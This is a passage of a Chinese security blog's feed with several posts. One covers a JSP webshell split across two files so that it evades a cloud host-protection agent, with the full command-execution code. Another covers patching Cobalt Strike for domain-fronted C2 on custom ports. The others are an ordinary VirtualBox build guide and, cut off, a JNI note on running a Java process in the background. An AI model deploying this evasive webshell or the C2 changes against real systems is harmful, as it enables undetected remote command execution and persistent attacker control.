class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;javax.el.ELProcessor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@include file=&quot;A.jsp&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ELProcessor processor = new ELProcessor();</span><br><span class="line">    Process process = (Process) processor.eval(</span><br><span class="line">            &quot;\&quot;\&quot;.getClass()&quot; +</span><br><span class="line">                    &quot;.forName(\&quot;javax.script.ScriptEngineManager\&quot;).&quot; +</span><br><span class="line">                    &quot;newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&apos;(java.lang.String[])&apos;]([&apos;&quot; +</span><br><span class="line">                    cmd + &quot;&apos;]).start()\&quot;)&quot;);</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));</span><br><span class="line">    String line;</span><br><span class="line">    while ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">        sb.append(line).append(&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getOutputStream().write(sb.toString().getBytes());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>A.jsp 只负责取参，看起来没有问题。</p><p>B.jsp sink没有被硬杀，而且缺少 A.jsp 的情况编译不过，跑不起来动态监测不了。</p><p>完全绕过。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;玩某云的“卷完计划”想到的姿势，分享一下。&lt;/p&gt;
&lt;p&gt;某云的骑士号称是采用先进的动态监测技术，结合主机智能内核AI检测技术等多种引擎零规则查杀，做到低误报，高查杀率。&lt;/p&gt;
&lt;p&gt;测下来查杀率确实高，只要出现 &lt;code&gt;Runtime.getRuntime().ex
      
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jayl1n.github.io/tags/Java/"/>
    
      <category term="RedTeam" scheme="https://jayl1n.github.io/tags/RedTeam/"/>
    
      <category term="红蓝对抗" scheme="https://jayl1n.github.io/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="JSP" scheme="https://jayl1n.github.io/tags/JSP/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 下编译 VirtualBox</title>
    <link href="https://jayl1n.github.io/2021/01/03/compile-virtualbox-on-macos10-15/"/>
    <id>https://jayl1n.github.io/2021/01/03/compile-virtualbox-on-macos10-15/</id>
    <published>2021-01-03T08:23:34.000Z</published>
    <updated>2021-01-03T08:25:16.804Z</updated>
    
    <content type="html"><![CDATA[<p>在编译 VBox 的时候遇到了许多坑，记录一下。</p><p>环境是 MacOS 10.15 Catalina，VBox 6.1.16 。</p><h1 id="安装SDK"><a href="#安装SDK" class="headerlink" title="安装SDK"></a>安装SDK</h1><p>Xcode10之后编译系统改了，我们需要用老版本的Xcode编译，所以要用 <a href="https://github.com/devernay/xcodelegacy" target="_blank" rel="noopener">XcodeLegacy</a> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone --depth=1 https://hub.fastgit.org/devernay/xcodelegacy.git</span><br><span class="line">cd xcodelegacy</span><br></pre></td></tr></table></figure><p>再下载 <a href="https://download.developer.apple.com/Developer_Tools/Xcode_6.4/Xcode_6.4.dmg" target="_blank" rel="noopener">Xcode6.4</a> ，放到 xcodelegacy 目录下。</p><p>安装一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./XcodeLegacy.sh -osx109 buildpackages</span><br><span class="line">sudo ./XcodeLegacy.sh -osx109 install</span><br></pre></td></tr></table></figure><h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><ul><li>安装 homebrew，<code>brew install libidl openssl pkg-config qt</code></li><li>JDK版本&gt;=6 ，我用的 JDK8</li><li>openssl</li></ul><h2 id="编译-openssl"><a href="#编译-openssl" class="headerlink" title="编译 openssl"></a>编译 openssl</h2><p>link 的时候可能会因为目标版本不一致出现问题，需要用 10.9 编译的 openssl</p><p>下载 <a href="https://www.openssl.org/source/openssl-1.1.1i.tar.gz" target="_blank" rel="noopener">openssl</a> ，解压后编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./config CFLAGS=&quot;-g -O2 -mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; CXXFLAGS=&quot;-g -O2 -mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; LDFLAGS=&quot;-mmacosx-version-min=10.9 -isysroot /Developer/SDKs/MacOSX10.9.sdk&quot; --prefix=/usr/local/opt/openssl@1.1.1i</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>下面开始编译，中途可能还会有些编译错误，需要自己解决一下。末尾有我遇到的问题及解决。</p><p>先修改 configure 的 check_darwinversion()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">check_darwinversion()</span><br><span class="line">&#123;</span><br><span class="line">  test_header &quot;Darwin version&quot;</span><br><span class="line">  darwin_ver=`uname -r`</span><br><span class="line">  case &quot;$darwin_ver&quot; in</span><br><span class="line">+    19\.*)</span><br><span class="line">+      check_xcode_sdk_path &quot;$WITH_XCODE_DIR&quot;</span><br><span class="line">+      [ $? -eq 1 ] || fail</span><br><span class="line">+      darwin_ver=&quot;10.15&quot; # Catalina</span><br><span class="line">+   sdk=$WITH_XCODE_DIR/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.9.sdk</span><br><span class="line">+      cnf_append &quot;VBOX_WITH_MACOSX_COMPILERS_FROM_DEVEL&quot; &quot;1&quot;</span><br><span class="line">+      cnf_append &quot;VBOX_PATH_MACOSX_DEVEL_ROOT&quot; &quot;$WITH_XCODE_DIR/Developer&quot;</span><br><span class="line">+      CXX_FLAGS=&apos;--std=c++11&apos;</span><br><span class="line">+      ;;</span><br><span class="line">    17\.*)</span><br><span class="line">      check_xcode_sdk_path &quot;$WITH_XCODE_DIR&quot;</span><br><span class="line">      [ $? -eq 1 ] || fail</span><br><span class="line">      darwin_ver=&quot;10.13&quot; # High Sierra</span><br><span class="line">      sdk=$WITH_XCODE_DIR/Developer/SDKs/MacOSX10.6.sdk</span><br><span class="line">      cnf_append &quot;VBOX_WITH_MACOSX_COMPILERS_FROM_DEVEL&quot; &quot;1&quot;</span><br><span class="line">      cnf_append &quot;VBOX_PATH_MACOSX_DEVEL_ROOT&quot; &quot;$WITH_XCODE_DIR/Developer&quot;</span><br><span class="line">      ;;</span><br></pre></td></tr></table></figure><p>配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --disable-hardening --with-xcode-dir=/Developer/SDKs/MacOSX10.9.sdk \</span><br><span class="line">--with-openssl-dir=/usr/local/opt/openssl@1.1.1i --with-qt-dir=/usr/local/Cellar/qt/5.15.2</span><br></pre></td></tr></table></figure><p>修改 tools/kBuildTools/VBoxXcode62.kmk ，开启 c++11 支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-TOOL_VBoxXcode62_CXXFLAGS         ?=</span><br><span class="line">+TOOL_VBoxXcode62_CXXFLAGS         ?= --std=c++11</span><br><span class="line"></span><br><span class="line">-TOOL_VBoxXcode62_OBJCXXFLAGS          ?=</span><br><span class="line">+TOOL_VBoxXcode62_OBJCXXFLAGS          ?= --std=c++11</span><br></pre></td></tr></table></figure><p>一处程序错误 src/VBox/Devices/USB/darwin/USBProxyDevice-darwin.cpp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-    AssertReturn(RefMatchingDict != IO_OBJECT_NULL, VERR_OPEN_FAILED);</span><br><span class="line">+    AssertReturn(RefMatchingDict, VERR_OPEN_FAILED);</span><br></pre></td></tr></table></figure><p>开始编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source env.sh</span><br><span class="line">kmk</span><br></pre></td></tr></table></figure><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ul><li><p>报错 <code>yasm: Bad CPU type in executable</code></p><p>因为不支持 32 位应用，需要用 x64 的 yasm 替换，</p><p><code>brew install yasm &amp;&amp; cp /usr/local/Cellar/yasm/1.3.0_2/bin/yasm tools/darwin.amd64/bin/</code></p></li><li><p>报错 <code>kBuild: iasl VBoxDD ....</code></p><p>问题同上，找 x64 的 iasl 替换，<a href="https://bitbucket.org/RehabMan/acpica/downloads/iasl.zip" target="_blank" rel="noopener">https://bitbucket.org/RehabMan/acpica/downloads/iasl.zip</a> ,</p><p><code>cp iasl tools/darwin.amd64/bin/iasl</code></p></li><li><p>找不到 libqcocoa.dylib</p><p>修改 AutoConfig.kmk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- PATH_SDK_QT5_INC               := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line">- PATH_SDK_QT5_LIB               := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line">- PATH_SDK_QT5                   := /usr/local/Cellar/qt/5.15.2/Frameworks</span><br><span class="line"></span><br><span class="line">+ PATH_SDK_QT5_INC               := /usr/local/Cellar/qt/5.15.2/include</span><br><span class="line">+ PATH_SDK_QT5_LIB               := /usr/local/Cellar/qt/5.15.2/lib</span><br><span class="line">+ PATH_SDK_QT5                   := /usr/local/Cellar/qt/5.15.2/</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在编译 VBox 的时候遇到了许多坑，记录一下。&lt;/p&gt;
&lt;p&gt;环境是 MacOS 10.15 Catalina，VBox 6.1.16 。&lt;/p&gt;
&lt;h1 id=&quot;安装SDK&quot;&gt;&lt;a href=&quot;#安装SDK&quot; class=&quot;headerlink&quot; title=&quot;安装SD
      
    
    </summary>
    
    
    
      <category term="开发" scheme="https://jayl1n.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>魔改 CobaltStrike 3.14 实现域前置自定义端口</title>
    <link href="https://jayl1n.github.io/2020/04/10/pentest-cobaltstrike-improve/"/>
    <id>https://jayl1n.github.io/2020/04/10/pentest-cobaltstrike-improve/</id>
    <published>2020-04-10T07:08:53.000Z</published>
    <updated>2020-04-10T07:12:07.453Z</updated>
    
    <content type="html"><![CDATA[<p>国内VPS的 80,443 端口默认都是需要备案才能使用，所以如果 TeamServer 搭在国内，Listener 只能选择其他端口，一般使用是没什么问题，但如果要配置域前置，会遇到上线不了的问题。</p><h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>我配置了一个 8880 端口的 listener，并配置了 CloudFront （回源端口 8880），生成了指向 80 端口的后门。但运行后并没有上线，Wireshark 抓包分析一下。</p><blockquote><p>为了生成指向 80 端口的后门，我额外配置了一个 80 端口的 listener。</p></blockquote><p>可以看到，第一步确实向 cdn 请求了，也成功从 teamserver 获得了后续的 shellcode 并加载成功了(不然不会有第二步的请求)，但是第二步开始向 8880 端口拉取任务了，这里就出问题了，因为 cdn 域名的 8880 并不能到达 teamserver 的 8880。</p><p>所以我们要修改第二步的请求，强制让它继续和 80 端口通信。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal1.jpg" alt="p1"></p><p>那么，为什么第一步的访问的端口是对的，第二个是错的呢。</p><p>我们知道一般用的CS后门是 staging 模式的，执行过程可以分为两个部分 stage 和 stager 。第一步执行的是 stager ，负责通过各种路径（http&amp;https&amp;tcp）下载 stage，然后注入到内存中执行。第二步的 stage 是真正实现后门功能的部分。</p><p>因为生成 beacon 时，用的 listener 是监听 80 端口的，所以 beacon 第一次请求的确是向 80 端口发起的。</p><p>但实际上 cdn 的 80 端口指向的是 8880 端口的 listener，8880 接到请求，会返回 stage，stage 时在 teamserver 生成的，它并不知道我们是在通过 80 端口访问它，此时的 stage 是指向 8880 的。这造成了后续的请求都会指向 8880。</p><p>要解决问题，必须修改 teamserver 生成的 stage 指向的端口，但搜了一大圈，并没有找到相关的解决方法，AggressorScript 也只能在客户端动动刀子，想要修改 Listener 相关的得要从根源入手。</p><h1 id="杀死问题的办法-——-魔改"><a href="#杀死问题的办法-——-魔改" class="headerlink" title="杀死问题的办法 —— 魔改"></a>杀死问题的办法 —— 魔改</h1><p>我的思路是在创建 listener 的时候，再加一个选项，让 stage 用的端口和 listener 实际监听的端口分开。</p><blockquote><p>当然做👇这些之前要先反编译，我这里用的 <code>fernflower</code> ，用法略过。</p></blockquote><h2 id="0x01-UI"><a href="#0x01-UI" class="headerlink" title="0x01 UI"></a>0x01 UI</h2><p>CobaltStrike 用的是 swing 写的 UI，创建 Listener 的部分在 <code>aggressor.dialogs.ListenerDialog.show()</code></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal4.jpg" alt="p4"></p><p>用了 DialogManager 包装了每个 Dialog，调用 <code>DialogManager.text</code> 可以在当前 dialog 创建输入框，命名为 <code>bind port</code>，作为实际监听的端口。</p><p>来加一个输入框：</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal6.jpg" alt="p6"></p><p>当 <code>Save</code> 按钮按下时，会在后续触发到 <code>ListenerDialog.dialogResult</code></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal5.jpg" alt="p5"></p><p>这里检查了一下 domain 是否超长，通过了，就推送一个 <code>listeners.create</code> 请求到 teamserver，参数是 listener 的名字和配置信息，再之后 listener 就会在 teamserver 建立。</p><p>我们下一步是要把 <code>bind port</code> 传到 <code>this.options</code>，这里有点绕，在调用 <code>DialogManager.text</code> 的时候创建一个内部的 <code>DialogListener</code>。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal7.jpg" alt="p7"></p><p>在 <code>DialogManager.addDilogListenerInternal</code> 可以看到会把创建的 <code>DialogListener</code> 加到</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal9.jpg" alt="p9"></p><p><code>Save</code> 按钮实际是 <code>DialogManager.action_noclose</code> 生成的<br>这里的，点击事件可以在这里找到。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal10.jpg" alt="p10"></p><p>这里调用了之前的创建的匿名 <code>DialogListener</code>，将值传到 <code>this.options</code>，所以创建的输入框会自动把值添加到配置里来，😭绕了一圈啥也不用干。</p><p>为了能在 <code>Listeners</code> 这个 Tab 直接看到设置的 <code>bind port</code>， 给 <code>aggressor.windows.ListenerManager</code> 的 <code>cols</code> 加上 <code>bind port</code> 就会自动加载进来了。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal13.jpg" alt="p13"></p><p>效果如下：</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal12.jpg" alt="p12"></p><h2 id="0x02-Listener"><a href="#0x02-Listener" class="headerlink" title="0x02 Listener"></a>0x02 Listener</h2><p>在各处调用 Listener 时，会创建 <code>common.Listener</code> 实例，里面是没有 <code>bind port</code> 字段的，所以要给它加上。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal19.jpg" alt="p19"></p><h2 id="0x03-Stage"><a href="#0x03-Stage" class="headerlink" title="0x03 Stage"></a>0x03 Stage</h2><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal11.jpg" alt="p11"></p><p>teamserver 接到创建 Listener 的请求后，会先把 Listener 序列化保存下来，以便下次 teamserver 重启的时候可以自动监听。</p><p>然后本地调用 <code>beacons.start</code> 。这里的调用链有点长:</p><p>server.Beacons.call() -&gt; server.Beacons.setup() -&gt; beacon.BeaconsSetup.start() -&gt; server.WebCalls.getWebServer() -&gt; beacon.BeaconSetup.exportBeaconStage()</p><p>最主要的是两个地方 <code>server.WebCalls.getWebServer()</code> 创建 Web 服务，<code>beacon.BeaconSetup.exportBeaconStage</code> 构造 Stage 的 shellcode。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal14.jpg" alt="p14"></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal15.jpg" alt="p15"></p><p>这里的 <code>var1</code> 是监听的端口号，默认的 Stage 指向的端口和 Listener 监听的端口号是同一个，现在我们要让他们的端口分离，因为 <code>start()</code> 参数不是 <code>Map</code> ，所以不能直接往里加一个参数，只能重写或者重载一下这个方法。</p><p>我直接重写了一下，加了一个参数 <code>bindPort</code>，创建 Web 服务时，就用这个端口。Stage 还是用原来的 <code>var1</code> 作为端口，不用修改。这样创建 <code>Listener</code> 的时候，原来端口号代表 Stage 用的</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal16.jpg" alt="p16"></p><p>相应的，上层的调用链也要修改一下。</p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal17.jpg" alt="p17"></p><p><img src="/2020/04/10/pentest-cobaltstrike-improve/anal18.jpg" alt="p18"></p><h2 id="0x05-编译-amp-替换"><a href="#0x05-编译-amp-替换" class="headerlink" title="0x05 编译 &amp; 替换"></a>0x05 编译 &amp; 替换</h2><p>然后要把修改过的代码编译一下，替换到 jar 里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">javac -cp cobaltstrike.jar common/Listener.java</span><br><span class="line">zip -u cobaltstrike.jar common/Listener.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/dialogs/ListenerDialog.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/dialogs/ListenerDialog.class</span><br><span class="line">javac -cp cobaltstrike.jar aggressor/windows/ListenerManager.java </span><br><span class="line">zip -u cobaltstrike.jar aggressor/windows/ListenerManager.class</span><br><span class="line">javac -cp cobaltstrike.jar server/Beacons.java</span><br><span class="line">zip -u cobaltstrike.jar server/Beacons.class</span><br><span class="line">javac -cp cobaltstrike.jar beacon/BeaconSetup.java </span><br><span class="line">zip -u cobaltstrike.jar beacon/BeaconSetup.class</span><br></pre></td></tr></table></figure><p>⬆️可能有点遗漏的，各位自己调一下吧。</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/2020/04/10/pentest-cobaltstrike-improve/rrr.jpg" alt="rrr"></p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>这是一篇19年的存稿，当时还没有 <a href="https://www.cobaltstrike.com/help-http-beacon" target="_blank" rel="noopener">CS 4.0</a>，这个问题 4.0 已经解决了，可以配置 Listener 的 <code>C2 Port</code> 和 <code>Bind Port</code>，将 C2 的端口与 teamserver 实际监听的端口分开。</p><p>现在放出来，也算抛砖引玉，给想要修改 CS 的小伙计提供点经验，欢迎交流～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;国内VPS的 80,443 端口默认都是需要备案才能使用，所以如果 TeamServer 搭在国内，Listener 只能选择其他端口，一般使用是没什么问题，但如果要配置域前置，会遇到上线不了的问题。&lt;/p&gt;
&lt;h1 id=&quot;问题分析&quot;&gt;&lt;a href=&quot;#问题分析&quot; cl
      
    
    </summary>
    
    
    
      <category term="RedTeam" scheme="https://jayl1n.github.io/tags/RedTeam/"/>
    
      <category term="红蓝对抗" scheme="https://jayl1n.github.io/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
      <category term="Pentest" scheme="https://jayl1n.github.io/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Java 实现后台执行</title>
    <link href="https://jayl1n.github.io/2020/02/13/java-nohup-implementation/"/>
    <id>https://jayl1n.github.io/2020/02/13/java-nohup-implementation/</id>
    <published>2020-02-13T06:12:04.000Z</published>
    <updated>2020-02-21T03:10:02.852Z</updated>
    
    <content type="html"><![CDATA[<p>常用的将程序放到后台执行，并在shell退出后依然运行的方法，是使用 <code>nohup</code> 与 <code>&amp;</code>，比如 <code>nohup java -jar abc.jar &amp;</code>。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><code>nohup</code> 的作用是忽略 <code>SIGHUP</code> 信号。当一个shell关闭后，会向运行的程序发送 <code>SIGHUP</code> 信号，通知同一shell内的各个进程，它们与控制终端不再关联。系统对 <code>SIGHUP</code> 信号的默认处理是终止收到该信号的进程。</p><p><code>&amp;</code> 的作用是忽略 <code>SIGINT</code> 信号。<code>Ctrl+C</code> 会向前台进程发送 <code>SIGINT</code> 信号，以关闭程序。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>综上，只要我们能实现 <code>nohup</code> 和 <code>&amp;</code> 的功能，就能让程序在后台运行，不会因为 shell 断开而中断了。</p><p>由于题目是用 Java 实现，而 Java 本身并不能进行如此底层的操作，所以思路是使用 JNI，借助 C/C++ 实现。</p><p>直接上代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> io.github.jayl1n.daemon;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">ignoreSignal</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>javah io.github.jayl1n.daemon.Main</code> 生成头文件，添加到 C++ 项目里。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"io_github_jayl1n_daemon_Main.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jboolean JNICALL <span class="title">Java_io_github_jayl1n_daemon_Main_ignoreSignal</span><span class="params">(JNIEnv *, jobject)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//忽略 SIGHUP SIGINT 信号，防止 shell 断开 ，Ctrl+C 中断程序</span></span><br><span class="line">    signal(SIGHUP, SIG_IGN);</span><br><span class="line">    signal(SIGINT, SIG_IGN);</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成出来的动态库，需要放到与jar包相同的目录下，或者是 <code>java.library.path</code> 指定的路径，否则在 <code>System.loadLibrary</code> 时无法找到动态库。</p><p><code>java.library.path</code> 变量可以在执行时添加 <code>-Djava.library.path=/a/b/c</code> 参数指定。<code>System.getProperty(&quot;java.library.path&quot;)</code> 可以查看当前的路径。但无法通过 <code>System.setProperty(&quot;java.library.path&quot;,&quot;/a/b/c&quot;)</code> 修改，因为在 JVM 启动时就会缓存这个值，后续修改不会生效，可以通过反射来清除 <code>ClassLoader</code> 的 <code>sys_paths</code> 变量(缓存标志)，重新初始化 <code>usr_paths</code>，代码如下：</p><p>java/lang/ClassLoader.java:1815</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(Class&lt;?&gt; fromClass, String name, <span class="keyword">boolean</span> isAbsolute)</span> </span>&#123;</span><br><span class="line">    ClassLoader loader = (fromClass == <span class="keyword">null</span>) ? <span class="keyword">null</span> : fromClass.getClassLoader();</span><br><span class="line">    <span class="keyword">if</span> (sys_paths == <span class="keyword">null</span>) &#123;</span><br><span class="line">        usr_paths = initializePath(<span class="string">"java.library.path"</span>);</span><br><span class="line">        sys_paths = initializePath(<span class="string">"sun.boot.library.path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isAbsolute) &#123;</span><br><span class="line">        <span class="keyword">if</span> (loadLibrary0(fromClass, <span class="keyword">new</span> File(name))) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(<span class="string">"Can't load library: "</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>第三行，<code>sys_paths</code> 不为 null 时，不会再初始化 <code>java.library.path</code>，相当于是第一次读取就被缓存到了 <code>usr_paths</code>。</p><p>通过反射清除 <code>sys_paths</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//先修改 java.library.path</span></span><br><span class="line">    System.setProperty(<span class="string">"java.library.path"</span>, System.getProperty(<span class="string">"java.library.path"</span>) + <span class="string">":/Users/jaylin/daemon-demo/bin"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清除缓存标志</span></span><br><span class="line">    Field sys_paths = ClassLoader.class.getDeclaredField(<span class="string">"sys_paths"</span>);</span><br><span class="line">    sys_paths.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    sys_paths.set(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//后续再 loadLibrary 时，将会使用新的 usr_paths</span></span><br></pre></td></tr></table></figure><p>👆上面说了一个奇迹淫巧，在有多个动态库，相互依赖时比较有用。</p><p>这里其实也可以使用 <code>System.load</code> 直接指定绝对路径（注意和<code>System.loadLibrary</code> 的区别）。</p><p>由于动态库无法直接打包到 <code>jar</code> 包里用，所以一般是要分开上传到服务器。</p><p>为了优雅的使用动态库，可以硬编码到 jar 包里，在执行时释放出来，JNI 支持延时加载动态库。</p><p>这里我使用 base64 编码， <code>cat /Users/jaylin/daemon-demo/bin/libdaemon_jni.dylib | base64</code>，下面写个例子，定时输出字符到 <code>/tmp/test</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    private native boolean ignoreSignal();</span><br><span 